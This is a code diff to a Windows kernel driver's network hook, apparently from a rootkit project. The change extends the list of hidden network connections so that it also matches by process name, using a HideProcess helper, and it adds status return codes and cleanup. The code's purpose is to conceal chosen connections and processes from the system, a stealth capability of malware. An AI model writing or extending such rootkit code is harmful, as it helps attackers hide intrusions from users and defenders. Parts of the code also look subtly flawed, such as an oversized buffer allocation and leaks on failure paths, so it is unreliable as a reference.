@@ -1,4 +1,4 @@
-#include <wdm.h>
+#include "HideProcess.h"
 #include "NetworkHook.h"
 
 NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListHead = NULL;
@@ -25,16 +25,17 @@ NTSTATUS NetHook::InitNetworkHook()
 	return status;
 }
 
-VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
+NTSTATUS NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
 {
 	if ((NewConnection->IpAddress == 0) && 
 		(NewConnection->RemoteIpAddress == 0) && 
 		(NewConnection->Port == 0) && 
 		(NewConnection->ConnectPID == 0) &&
+		(NewConnection->ConnectProcess.Buffer == nullptr) &&
 		(NewConnection->_Unknown == 0))
 	{
 		KdPrint(("Empty Connection!"));
-		return;
+		return STATUS_INVALID_PARAMETER;
 	}
 
 	if (g_NetworkLinkedListHead != NULL)
@@ -47,12 +48,13 @@ VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewCo
 				((NewConnection->Port) && (CurrentEntry->Connection->Port == NewConnection->Port)) ||
 				((NewConnection->RemoteIpAddress) && (CurrentEntry->Connection->RemoteIpAddress == NewConnection->RemoteIpAddress)) ||
 				((NewConnection->ConnectPID) && (CurrentEntry->Connection->ConnectPID == NewConnection->ConnectPID)) ||
+				((NewConnection->ConnectProcess.Buffer) && 
+					(0 == RtlCompareUnicodeString(&CurrentEntry->Connection->ConnectProcess, &NewConnection->ConnectProcess, TRUE))) ||
 				((NewConnection->_Unknown) && (CurrentEntry->Connection->_Unknown == NewConnection->_Unknown)))
 			{
 				KdPrint(("Connection Already Exists"));
-				return;
+				return STATUS_SUCCESS;
 			}
-
 			CurrentEntry = CurrentEntry->NextEntry;
 		}
 	}
@@ -61,20 +63,33 @@ VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewCo
 	if (!NewEntry)
 	{
 		KdPrint(("ExAllocatePool Failed: Could not allocate NET_CONNECTION_ENTRY"));
-		return;
+		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
 	NewEntry->Connection = (PNETHOOK_HIDDEN_CONNECTION)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(NETHOOK_HIDDEN_CONNECTION), TAG_NET);
 	if (!NewEntry->Connection)
 	{
 		KdPrint(("ExAllocatePool Failed: Could not allocate NETHOOK_HIDDEN_CONNECTION"));
-		return;
+		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
 	NewEntry->Connection->IpAddress = NewConnection->IpAddress;
 	NewEntry->Connection->Port = NewConnection->Port;
 	NewEntry->Connection->RemoteIpAddress = NewConnection->RemoteIpAddress;
 	NewEntry->Connection->ConnectPID = NewConnection->ConnectPID;
+	if (NewConnection->ConnectProcess.Buffer && NewConnection->ConnectProcess.Length)
+	{
+		NewEntry->Connection->ConnectProcess.Buffer = (PWCH)ExAllocatePool2(POOL_FLAG_NON_PAGED, NewConnection->ConnectProcess.MaximumLength * sizeof(WCHAR), TAG_NET);
+		if (NewEntry->Connection->ConnectProcess.Buffer == nullptr)
+		{
+			KdPrint(("ExAllocatePool Failed: Could not allocate NETHOOK_HIDDEN_CONNECTION.ProcessName"));
+			return STATUS_INSUFFICIENT_RESOURCES;
+		}
+		NewEntry->Connection->ConnectProcess.Length = NewConnection->ConnectProcess.Length;
+		NewEntry->Connection->ConnectProcess.MaximumLength = NewConnection->ConnectProcess.MaximumLength;
+		RtlUnicodeStringCopy(&NewEntry->Connection->ConnectProcess, &NewConnection->ConnectProcess);
+	}
+	
 	NewEntry->Connection->_Unknown = NewConnection->_Unknown;
 
 	if (!g_NetworkLinkedListHead)
@@ -109,8 +124,14 @@ VOID NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewCo
 	{
 		KdPrint(("PID %d Added Successfully!", NewEntry->Connection->ConnectPID));
 	}
-}
 
+	if (NewEntry->Connection->ConnectProcess.Buffer)
+	{
+		KdPrint(("Process[%wZ] Added Successfully!", &NewEntry->Connection->ConnectProcess));
+	}
+
+	return STATUS_SUCCESS;
+}
 
 BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
 	_In_ const USHORT PortNumber,
@@ -136,7 +157,8 @@ BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
 		if ((IpAddress && (CurrentEntry->Connection->IpAddress == IpAddress)) ||
 			(Port.port && (CurrentEntry->Connection->Port == Port.port)) ||
 			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)) ||
-			(ConnectPID && (CurrentEntry->Connection->ConnectPID == ConnectPID)))
+			(ConnectPID && (CurrentEntry->Connection->ConnectPID == ConnectPID)) || 
+			(ConnectPID && HideProcess::DoesPIDBelongToProcessName(ConnectPID, CurrentEntry->Connection->ConnectProcess)))
 		{
 			return TRUE;
 		}
@@ -157,6 +179,14 @@ VOID NetHook::UnHookNetworkProxy()
 	{
 		PNET_CONNECTION_ENTRY TempPtr = g_NetworkLinkedListHead->NextEntry;
 		PNETHOOK_HIDDEN_CONNECTION TempConn = g_NetworkLinkedListHead->Connection;
+
+		if (TempConn->ConnectProcess.Buffer != nullptr)
+		{
+			ExFreePoolWithTag(TempConn->ConnectProcess.Buffer, TAG_NET);
+			TempConn->ConnectProcess.Buffer = nullptr;
+			TempConn->ConnectProcess.Length = 0;
+			TempConn->ConnectProcess.MaximumLength = 0;
+		}
 		
 		ExFreePoolWithTag(TempConn, TAG_NET);
 		TempConn = NULL;
